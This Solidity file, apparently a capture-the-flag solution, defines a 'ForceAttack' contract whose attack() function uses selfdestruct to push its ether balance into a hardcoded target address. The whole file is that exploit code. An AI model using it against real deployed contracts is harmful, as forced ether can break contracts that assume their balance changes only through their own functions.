// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {

  constructor() payable {}

  function attack() public {
    selfdestruct(payable(0x1F708C24a0D3A740cD47cC0444E9480899f3dA7D));
  }
}